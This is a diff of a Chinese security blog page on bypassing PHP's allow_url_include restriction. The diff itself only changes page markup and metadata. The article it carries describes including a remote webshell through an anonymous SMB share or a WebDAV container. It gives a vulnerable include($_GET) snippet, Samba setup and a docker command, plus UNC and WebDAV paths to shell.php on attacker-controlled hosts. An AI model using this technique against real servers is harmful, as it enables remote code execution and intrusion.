@@ -21,13 +21,13 @@
     
     
     <meta name="keywords" content="一些姿势,文件包含">
-    <meta name="description" content="前言下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。 绕过思路假设我们有一个这样的代码 &amp;lt;?php include($_GET[&quot;shell&quot;]); ?&amp;gt;  我们发现通过phpinfo发现allow_url_fopen=Off和allow_url_include=Off  用常规的方法直接包含一个远程文件肯定是不行的  所以我们得想办法绕过allow_url_f">
+    <meta name="description" content="前言下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。 绕过思路假设我们有一个这样的代码 &amp;lt;?php include($_GET[&quot;shell&quot;]); ?&amp;gt;  我们发现通过phpinfo发现allow_url_fopen=Off和allow_url_include=Off">
 <meta name="keywords" content="一些姿势,文件包含">
 <meta property="og:type" content="article">
 <meta property="og:title" content="bypass-RFI限制的一些思路">
 <meta property="og:url" content="https://byqiyou.github.io/2019/05/15/bypass-RFI限制的一些思路/index.html">
 <meta property="og:site_name" content="七友">
-<meta property="og:description" content="前言下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。 绕过思路假设我们有一个这样的代码 &amp;lt;?php include($_GET[&quot;shell&quot;]); ?&amp;gt;  我们发现通过phpinfo发现allow_url_fopen=Off和allow_url_include=Off  用常规的方法直接包含一个远程文件肯定是不行的  所以我们得想办法绕过allow_url_f">
+<meta property="og:description" content="前言下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。 绕过思路假设我们有一个这样的代码 &amp;lt;?php include($_GET[&quot;shell&quot;]); ?&amp;gt;  我们发现通过phpinfo发现allow_url_fopen=Off和allow_url_include=Off">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190514223651-b6220bf6-7655-1.png">
@@ -38,7 +38,7 @@
 <meta property="og:updated_time" content="2019-06-26T08:03:46.096Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bypass-RFI限制的一些思路">
-<meta name="twitter:description" content="前言下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。 绕过思路假设我们有一个这样的代码 &amp;lt;?php include($_GET[&quot;shell&quot;]); ?&amp;gt;  我们发现通过phpinfo发现allow_url_fopen=Off和allow_url_include=Off  用常规的方法直接包含一个远程文件肯定是不行的  所以我们得想办法绕过allow_url_f">
+<meta name="twitter:description" content="前言下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。 绕过思路假设我们有一个这样的代码 &amp;lt;?php include($_GET[&quot;shell&quot;]); ?&amp;gt;  我们发现通过phpinfo发现allow_url_fopen=Off和allow_url_include=Off">
 <meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png">
     
     <link rel="shortcut icon" href="/favicon.ico">
@@ -64,7 +64,7 @@
           <img src="/img/avatar.jpg">
         </a>
         <hgroup class="introduce">
-          <h5 class="nickname">七友</h5>
+          <h5 class="nickname"></h5>
           <a href="mailto:1920854803@qq.com" title="1920854803@qq.com" class="mail">1920854803@qq.com</a>
         </hgroup>
       </div>
@@ -208,9 +208,21 @@
 <span class="token delimiter">?></span>
 </code></pre>
 <p>我们发现通过<code>phpinfo</code>发现<code>allow_url_fopen=Off</code>和<code>allow_url_include=Off</code></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>用常规的方法直接包含一个远程文件肯定是不行的</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514223651-b6220bf6-7655-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514223651-b6220bf6-7655-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <p>所以我们得想办法绕过<code>allow_url_fopen=Off</code>和<code>allow_url_include=Off</code>的限制</p>
 <h2 id="第一种姿势：利用SMB文件共享服务"><a href="#第一种姿势：利用SMB文件共享服务" class="headerlink" title="第一种姿势：利用SMB文件共享服务"></a>第一种姿势：利用<code>SMB</code>文件共享服务</h2><p>对于PHP而言即使<code>allow_url_include</code>和<code>allow_url_fopen</code>都设置为<code>Off</code>，PHP也会加载SMB URL。所以我们可以配合<code>SMB</code>远程加载我们的<code>webshell</code>，我们同时要设置<code>SMB</code>共享服务器允许外部访问我们的<code>webshell</code>文件，所以我们需要配置一个具有匿名浏览访问权限的SMB服务器，一旦受害者尝试访问我们的<code>SMB</code>服务器上的<code>webshell</code>，我们的<code>SMB</code>服务器将不会请求任何凭证，受害者就会包含我们的<code>SMB</code>服务器上的webshell文件</p>
 <h3 id="SAMBA服务器配置"><a href="#SAMBA服务器配置" class="headerlink" title="SAMBA服务器配置"></a>SAMBA服务器配置</h3><blockquote>
@@ -250,16 +262,40 @@ force user = nobody
 </code></pre><p>重启<code>smb</code>服务</p>
 <pre><code>service smbd restart
 </code></pre><p>然后访问一下，发现可以正常访问</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222432-fe128316-7653-1.png" alt="image.png"></p>
-<p><code>\\192.168.163.128\ica\shell.php</code>内容为：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514224804-47be592e-7657-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222432-fe128316-7653-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p><code>\\192.168.163.128\ica\shell.php</code>内容为：<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514224804-47be592e-7657-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><p></p>
 <p>尝试包含一波，成功包含</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222633-460cdae0-7654-1.png" alt="image.png"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222633-460cdae0-7654-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这种方法还是比较局限的，因为这种<code>unc</code>只能是在windows下使用，而且国内的运营商对<code>smb</code>还是比较敏感的，毕竟被勒索病毒搞怕了/捂脸。。。。。</p>
 <h2 id="第二种姿势：利用webdav"><a href="#第二种姿势：利用webdav" class="headerlink" title="第二种姿势：利用webdav"></a>第二种姿势：利用webdav</h2><p><strong> PS：这个思路是Lz1y师傅在ph师傅小密圈提到的，tql </strong></p>
 <p>用docker启动一个webdav服务器（ph师傅给的）</p>
 <pre><code>docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav
 </code></pre><p>然后把php文件放到<code>~/webdav/data</code>里面</p>
-<p>尝试包含，包含成功<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190515001220-0d01bde2-7663-1.png" alt="image.png"><br>注意包含的路径是<code>//ip//webdav/shell.php</code>而不是<code>//ip/webdav/shell.php</code>，至于为什么呢我也不是很清楚，如果是用浏览器直接打开的话两种方式都可以，但是不知道为啥放在<code>php</code>上后者的那种方式就不行了，有知道的师傅还请不吝赐教。</p>
+<p>尝试包含，包含成功<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190515001220-0d01bde2-7663-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure><br>注意包含的路径是<code>//ip//webdav/shell.php</code>而不是<code>//ip/webdav/shell.php</code>，至于为什么呢我也不是很清楚，如果是用浏览器直接打开的话两种方式都可以，但是不知道为啥放在<code>php</code>上后者的那种方式就不行了，有知道的师傅还请不吝赐教。<p></p>
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -298,8 +334,8 @@ force user = nobody
     
     <footer>
         <a href="https://byqiyou.github.io">
-            <img src="/img/avatar.jpg" alt="七友">
-            七友
+            <img src="/img/avatar.jpg" alt="">
+            
         </a>
     </footer>
 </blockquote>
@@ -471,7 +507,7 @@ force user = nobody
         </p>
     </div>
     <div class="bottom">
-        <p><span>七友 &copy; 2015 - 2019</span>
+        <p><span> &copy; 2015 - 2019</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
@@ -574,10 +610,10 @@ var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
     var OriginTitile = document.title, titleTime;
     document.addEventListener('visibilitychange', function() {
         if (document.hidden) {
-            document.title = '死鬼去哪里了！';
+            document.title = 'Leave';
             clearTimeout(titleTime);
         } else {
-            document.title = '(つェ⊂)咦!又好了!';
+            document.title = 'Come back';
             titleTime = setTimeout(function() {
                 document.title = OriginTitile;
             },2000);
